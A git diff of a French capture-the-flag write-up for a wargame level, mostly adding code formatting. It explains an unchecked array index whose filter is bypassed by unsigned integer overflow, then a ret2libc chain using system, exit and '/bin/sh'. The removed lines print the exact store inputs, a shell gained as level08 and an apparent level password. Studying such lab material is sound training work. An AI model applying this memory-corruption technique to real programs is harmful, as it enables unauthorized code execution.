@@ -1,32 +1,3 @@
-
-On est maintenant capable de modifier le saved-eip, il ne nous reste plus qu'a recuperer nos addresses pour ret2libc puis a les retranscir en nombres. 
-UINT_MAX: 4294967295
-
-system: 0xf7e6aed0 -> 4159090384
-exit: 0xf7e5eb70 -> 4159040368
-/bin/sh: 0xf7f897ec -> 4160264172
-
-_____________________________________
-Input command: store
- Number: 4159090384
- Index: 1073741938
- Completed store command successfully
-Input command: store
- Number: 4159040368
- Index: 115
- Completed store command successfully
-Input command: store
- Number: 4160264172
- Index: 116
- Completed store command successfully
-Input command: quit
-$ whoami
-level08
-______________________________________
-
-7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-
-
 # Level07
 
 ## Analyse
@@ -35,27 +6,27 @@ ______________________________________
 
 - On a au debut de la fonction une suppression des argv et de l'env.
 
-- Ensuite une boucle while(1) qui attend en entree les commandes via strcmp :
-    - store : qui va call store_number avec en parametre le tab data.
-    - read : qui va call read_number avec en parametre le tab data.
+- Ensuite une boucle while(1) qui attend en entree les commandes via `strcmp()` :
+    - store : qui va call `store_number()` avec en parametre le tab data.
+    - read : qui va call `read_number()` avec en parametre le tab data.
     - quit : qui va break la boucle.
 
 - On a un memset en fin de boucle pour reinitialiser le buffer commande.
 
 - Store_number :
     - declare deux unsigned int number et index
-    - Call scanf() deux fois via la fonction get_unum() pour recuperer le nombre et l'index a store dans le tab data.
+    - Call `scanf()` deux fois via la fonction `get_unum()` pour recuperer le nombre et l'index a store dans le tab data.
     - Avant cette operation il y a une verification : si l'index % 3 == 0 ou number >> 24 == 0xb7 alors return 1.
-    - Si cette verification est passee store alors data[index] = number.
+    - Si cette verification est passee store alors `data[index] = number`.
 
 - Read_number :
     - declare un unsigned int index
-    - initialise cette variable avec un call a scanf() via la fonction get_unum()
+    - initialise cette variable avec un call a `scanf()` via la fonction `get_unum()`
     - Ensuite va read l'element a l'index donne dans le tab data.
 
 ## Exploitation
 
-- Deja on observe qu'il n'y a pas de protection d'index lors du store_number :
+- Deja on observe qu'il n'y a pas de protection d'index lors du `store_number()` :
 
 ```
 Input command: store
@@ -86,11 +57,11 @@ Failed to do store command
 shl     eax, 0x2
 ```
 
-- Notamment dans la fonction store_number et read_number. Ces multiplications par 4 sont la pour calculer le decalage dans le tab car les valeurs en int : sizeof(int) = 4 bytes.
+- Notamment dans la fonction `store_number()` et `read_number()`. Ces multiplications par 4 sont la pour calculer le decalage dans le tab car les valeurs en int : `sizeof(int) = 4 bytes`.
 
 - Cela signifie que pour acceder aux index du tableau il est force a multiplie par 4 pour acceder au bon index.
 
-- La vérification "index % 3" se fait sur l'index original, pas sur le résultat après multiplication.
+- La vérification `index % 3` se fait sur l'index original, pas sur le résultat après multiplication.
 
 - Maintenant que l'on sait cela, on peut chercher une valeur qui multiplie par 4 va overflow le unsigned int et donner 114.
 
@@ -110,7 +81,7 @@ Input command: read
 
 - Nous avons donc reussi a modifier notre index 114. Cela nous laisse 3 espaces contigus : 114, 115, 116.
 
-- En reflechissant 2 minutes on peut penser a un ret2libc qui implique 3 adresses : system(), exit(), "/bin/sh".
+- En reflechissant 2 minutes on peut penser a un ret2libc qui implique 3 adresses : `system()`, `exit()`, `"/bin/sh"`.
 
 - Allons trouver ces adresses :
 
@@ -172,7 +143,7 @@ Index: 116
 Completed store command successfully
 ```
 
-- Plus qu'a quitter la boucle while avec la commande quit pour rediriger le flux d'execution vers notre ret2libc :
+- Plus qu'a quitter la boucle while avec la commande quit pour rediriger le flux d'execution vers notre `ret2libc` :
 
 ```
 Input command: quit
